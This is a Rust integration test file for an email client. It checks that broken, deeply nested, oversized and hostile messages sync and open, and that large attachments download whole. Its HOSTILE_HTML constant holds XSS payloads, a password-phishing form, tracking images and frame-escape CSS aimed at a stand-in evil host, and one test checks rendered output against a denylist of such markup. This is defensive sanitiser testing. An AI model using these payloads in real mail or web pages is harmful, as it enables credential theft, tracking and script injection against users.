//! Mail that is broken, hostile or huge, through the whole app against an IMAP server on loopback: each message syncs,
//! is listed, opens, and its frame's document is drawn, and nothing in one reaches the frame that could run there. A
//! message whose attachment is as large as a provider lets one be opens, and its file comes whole.

#![allow(clippy::unwrap_used)]

mod stand_in;

use mm_mailbox::lists::Paging;
use stand_in::{ADA, World, database, world};

/// A message of `head` (its header lines, each ending CRLF) and `body`, with a Message-ID of `name`'s.
fn mail(name: &str, head: &str, body: &str) -> Vec<u8> {
    format!("Message-ID: <{name}@example.test>\r\nTo: Ada <{ADA}>\r\n{head}\r\n{body}").into_bytes()
}

/// The usual From, Date and Subject.
fn usual(subject: &str) -> String {
    format!("From: Lin <lin@example.test>\r\nDate: Mon, 02 Nov 2026 09:00:00 +0000\r\nSubject: {subject}\r\n")
}

/// `depth` emails, each attached inside the one before.
fn nested_emails(depth: usize) -> Vec<u8> {
    let mut inner = b"From: Deep <deep@example.test>\r\nSubject: The bottom\r\n\r\nAt the bottom.\r\n".to_vec();
    for level in 0..depth {
        let mut outer = format!(
            "From: Lin <lin@example.test>\r\nSubject: Level {level}\r\nMIME-Version: 1.0\r\n\
             Content-Type: multipart/mixed; boundary=\"n{level}\"\r\n\r\n--n{level}\r\nContent-Type: text/plain\r\n\r\n\
             Forwarded.\r\n--n{level}\r\nContent-Type: message/rfc822\r\n\r\n"
        )
        .into_bytes();
        outer.extend_from_slice(&inner);
        outer.extend_from_slice(format!("\r\n--n{level}--\r\n").as_bytes());
        inner = outer;
    }
    let mut raw = b"Message-ID: <nested-emails@example.test>\r\nTo: Ada <ada@example.test>\r\n".to_vec();
    raw.extend_from_slice(&inner);
    raw
}

/// A multipart `depth` deep, each holding the next.
fn nested_multiparts(depth: usize) -> Vec<u8> {
    let mut raw = format!("Message-ID: <nested-parts@example.test>\r\nTo: Ada <{ADA}>\r\n")
        + &usual("Deep parts")
        + "MIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"p0\"\r\n\r\n";
    for level in 0..depth {
        raw += &format!("--p{level}\r\nContent-Type: multipart/mixed; boundary=\"p{}\"\r\n\r\n", level + 1);
    }
    raw += &format!("--p{depth}\r\nContent-Type: text/plain\r\n\r\nAt the bottom.\r\n");
    for level in (0..=depth).rev() {
        raw += &format!("--p{level}--\r\n");
    }
    raw.into_bytes()
}

/// HTML that tries every way out of its frame: scripts, handlers, a form, a frame of its own, CSS that would escape or
/// fetch, and images and links that would reach a server as it is read.
const HOSTILE_HTML: &str = r#"<html><head><script>parent.postMessage("x", "*")</script>
<style>@import url(https://evil.example.test/x.css); body { position: fixed; top: 0; background: url(https://evil.example.test/bg.png) }</style>
<meta http-equiv="refresh" content="0; url=https://evil.example.test/"><base href="https://evil.example.test/"></head>
<body onload="steal()"><p style="position:fixed;inset:0;z-index:99999">Pay now</p>
<img src="https://tracker.example.test/open.gif" onerror="steal()" width=1 height=1>
<form action="https://evil.example.test/login" method=post><input name=password type=password><button>Sign in</button></form>
<iframe src="https://evil.example.test/frame"></iframe><object data="https://evil.example.test/x.swf"></object>
<svg><script>steal()</script><a xlink:href="javascript:steal()">svg</a></svg>
<a href="javascript:steal()">click</a><a href="jav&#x09;ascript:steal()">tab</a>
<math><mtext><table><mglyph><style><img src=x onerror=steal()></style></mglyph></table></mtext></math>
</body></html>"#;

/// Every broken, hostile and outsized message, by name.
fn hostile() -> Vec<(&'static str, Vec<u8>)> {
    let html = format!("{}MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n", usual("Hostile HTML"));
    let mut wrong_charset =
        mail("wrong-charset", &(usual("Wrong charset") + "Content-Type: text/plain; charset=utf-8\r\n"), "");
    wrong_charset.extend_from_slice(b"Caf\xe9 cr\xe8me, \xff\xfe and \xc3\x28.\r\n");
    let mut raw_header = b"Message-ID: <raw-header@example.test>\r\nTo: Ada <ada@example.test>\r\nFrom: Lin \xe9\xff <lin@example.test>\r\nSubject: caf\xe9 \xff\xfe\x00 bytes\r\nDate: Mon, 02 Nov 2026 09:00:00 +0000\r\n\r\nBody.\r\n".to_vec();
    raw_header.extend_from_slice(b"\xf0\x28\x8c\x28\r\n");
    vec![
        (
            "no-boundary",
            mail(
                "no-boundary",
                &(usual("No boundary") + "MIME-Version: 1.0\r\nContent-Type: multipart/mixed\r\n"),
                "--\r\nWhere do the parts start?\r\n",
            ),
        ),
        (
            "unclosed",
            mail(
                "unclosed",
                &(usual("Unclosed") + "MIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=b\r\n"),
                "--b\r\nContent-Type: text/plain\r\n\r\nFirst.\r\n--b\r\nContent-Type: text/html\r\n\r\n<p>Never closed",
            ),
        ),
        (
            "unknown-charset",
            mail(
                "unknown-charset",
                &(usual("Unknown charset") + "Content-Type: text/plain; charset=x-klingon-7\r\n"),
                "Qapla\u{2019}!\r\n",
            ),
        ),
        ("wrong-charset", wrong_charset),
        ("raw-header", raw_header),
        (
            "broken-words",
            mail(
                "broken-words",
                "From: =?utf-8?B?!!!notbase64?= <lin@example.test>\r\nDate: Mon, 02 Nov 2026 09:00:00 +0000\r\n\
                 Subject: =?x-unknown?Q?abc?= =?utf-8?Q?unterminated and =?utf-8?B?w6k=?= =?=?=\r\n",
                "Words.\r\n",
            ),
        ),
        ("no-from-date-subject", mail("bare", "", "Who sent this, and when?\r\n")),
        (
            "in-1970",
            mail(
                "in-1970",
                "From: Lin <lin@example.test>\r\nDate: Thu, 01 Jan 1970 00:00:00 +0000\r\nSubject: Old\r\n",
                "Old.\r\n",
            ),
        ),
        (
            "in-2100",
            mail(
                "in-2100",
                "From: Lin <lin@example.test>\r\nDate: Fri, 31 Dec 2100 23:59:59 +0000\r\nSubject: Ahead\r\n",
                "Ahead.\r\n",
            ),
        ),
        (
            "no-date",
            mail(
                "no-date",
                "From: Lin <lin@example.test>\r\nDate: not a date at all\r\nSubject: When\r\n",
                "When?\r\n",
            ),
        ),
        ("long-subject", mail("long-subject", &usual(&"Long ".repeat(4000)), "Long.\r\n")),
        (
            "megabyte-header",
            mail(
                "megabyte-header",
                &format!("{}X-Junk: {}\r\n", usual("A megabyte of header"), "j".repeat(1 << 20)),
                "Short.\r\n",
            ),
        ),
        ("nested-emails", nested_emails(200)),
        ("nested-parts", nested_multiparts(500)),
        (
            "empty-files",
            mail(
                "empty-files",
                &(usual("Empty files") + "MIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=f\r\n"),
                "--f\r\nContent-Type: text/plain\r\n\r\nTwo files.\r\n--f\r\nContent-Type: application/pdf; name=empty.pdf\r\n\
                 Content-Disposition: attachment; filename=empty.pdf\r\nContent-Transfer-Encoding: base64\r\n\r\n\r\n\
                 --f\r\nContent-Type: application/octet-stream\r\nContent-Disposition: attachment\r\n\
                 Content-Transfer-Encoding: base64\r\n\r\nAAECAw==\r\n--f--\r\n",
            ),
        ),
        ("hostile-html", mail("hostile-html", &html, HOSTILE_HTML)),
        (
            "broken-rrule",
            mail(
                "broken-rrule",
                &(usual("Standup")
                    + "MIME-Version: 1.0\r\nContent-Type: text/calendar; method=REQUEST; charset=utf-8\r\n"),
                "BEGIN:VCALENDAR\r\nVERSION:2.0\r\nMETHOD:REQUEST\r\nBEGIN:VEVENT\r\nUID:standup@example.test\r\n\
                 DTSTART:20261103T090000Z\r\nDTEND:20261103T091500Z\r\nRRULE:FREQ=SOMETIMES;COUNT=-1;BYDAY=XX;UNTIL=never\r\n\
                 RRULE:FREQ=SECONDLY;INTERVAL=0\r\nEXDATE:garbage\r\nSUMMARY:Standup\r\n\
                 ORGANIZER:mailto:lin@example.test\r\nATTENDEE;PARTSTAT=NEEDS-ACTION:mailto:ada@example.test\r\n\
                 END:VEVENT\r\nEND:VCALENDAR\r\n",
            ),
        ),
    ]
}

/// The message key and UID of each of Ada's Inbox messages, by its Message-ID.
fn copies(w: &World) -> Vec<(String, i64, i64, i64)> {
    database(w.home.path())
        .read(|c| {
            let mut statement =
                c.prepare("SELECT COALESCE(message_id, ''), message_key, uid, pk FROM messages WHERE folder='INBOX'")?;
            let rows = statement.query_map([], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?)))?;
            rows.collect()
        })
        .unwrap()
}

#[test]
fn broken_and_hostile_mail_syncs_lists_and_opens_and_its_frame_holds_nothing_that_runs() {
    let imap = stand_in::Imap::start();
    let corpus = hostile();
    imap.add(
        ADA,
        "INBOX",
        corpus.iter().enumerate().map(|(at, (_, raw))| (u32::try_from(at).unwrap() + 1, raw.clone())),
    );
    let w = world(imap, &[ADA], &[]);
    w.app.syncing.sync_once();

    let page = Paging { offset: 0, limit: 100, grouped: false };
    let listed = w.app.reading.lists.messages_in(Some(ADA), "INBOX", page).unwrap();
    assert_eq!(listed["items"].as_array().unwrap().len(), corpus.len(), "every message is listed: {listed}");

    let stored = copies(&w);
    assert_eq!(stored.len(), corpus.len());
    for (message_id, key, uid, pk) in stored {
        let name = &corpus[usize::try_from(uid - 1).unwrap()].0;
        let opened = w.app.reading.bodies.message_body(pk, false).unwrap();
        assert_eq!(opened["ok"], true, "{name} ({message_id}) opens");
        let (status, document) =
            w.app.reading.bodies.copy_document(&key.to_string(), "INBOX", &uid.to_string(), false).unwrap();
        assert_eq!(status, 200, "{name}'s frame is drawn");
        let lower = document.to_lowercase();
        for never in [
            "<script",
            "onload",
            "onerror",
            "javascript:",
            "<form",
            "<iframe",
            "<object",
            "<base href",
            "http-equiv",
            "@import",
            "evil.example.test",
            "tracker.example.test",
            "position:fixed",
            "position: fixed",
        ] {
            assert!(!lower.contains(never), "{name}'s frame holds {never:?}");
        }
    }
}

#[test]
fn a_message_with_a_25_mb_attachment_opens_and_its_file_comes_whole() {
    // 25 MB attached, about 34 MB as the server sends it: more than one IMAP response line may run to.
    let imap = stand_in::Imap::start();
    imap.add(ADA, "INBOX", [(1, stand_in::with_pdf(1, "The plans, attached.", 33 << 10))]);
    let w = world(imap, &[ADA], &[]);
    w.app.syncing.sync_once();
    let pk = w.pk(ADA, "INBOX", 1);
    let opened = w.app.reading.bodies.message_body(pk, false).unwrap();
    assert_eq!(opened["ok"], true, "{}", opened["error"]);
    assert_eq!(opened["text"].as_str().map(str::trim), Some("The plans, attached."));
    let files = opened["attachments"].as_array().unwrap();
    assert_eq!(files.len(), 1, "{files:?}");
    let part = files[0]["part_id"].as_str().unwrap().to_owned();
    let file = w.app.reading.bodies.attachment(pk, &part).unwrap().unwrap();
    assert!(file.data.len() >= 24 << 20, "the file came whole: {} bytes", file.data.len());
    assert!(w.stored(ADA, "INBOX", 1).fetched, "and is kept, so it isn't fetched again");
}

#[test]
fn an_attachment_larger_than_a_message_may_send_downloads_whole() {
    // About 29 MiB attached: past the 25 MiB a person may send in one message, which is no limit on what they are sent.
    let imap = stand_in::Imap::start();
    imap.add(ADA, "INBOX", [(1, stand_in::with_pdf(1, "The plans, attached.", 40 << 10))]);
    let w = world(imap, &[ADA], &[]);
    w.app.syncing.sync_once();
    let opened = w.app.reading.bodies.message_body(w.pk(ADA, "INBOX", 1), false).unwrap();
    let part = opened["attachments"][0]["part_id"].as_str().unwrap().to_owned();
    let key = opened["key"].as_i64().unwrap();
    let target = format!("/api/message/attachment?key={key}&folder=INBOX&uid=1&part_id={part}");
    let request = axum::http::Request::get(target).body(axum::body::Body::empty()).unwrap();
    let runtime = tokio::runtime::Builder::new_multi_thread().enable_all().build().unwrap();
    let (status, kind, bytes) = runtime.block_on(async {
        let mut routes = mm_server::routes::router(w.app.clone());
        let response = tower_service::Service::call(&mut routes, request).await.unwrap();
        let kind = response.headers()[axum::http::header::CONTENT_TYPE].to_str().unwrap().to_owned();
        (response.status(), kind, axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap())
    });
    assert_eq!((status.as_u16(), kind.as_str()), (200, "application/pdf"));
    // 64 base64 characters a line of 66 bytes, 48 bytes once decoded.
    let lines = (40 << 20) / 66;
    assert_eq!(bytes.len(), lines * 48, "the file came whole");
    assert!(bytes.len() > 25 << 20);
    assert!(bytes.starts_with(b"%PDF-1.4\n"));
}
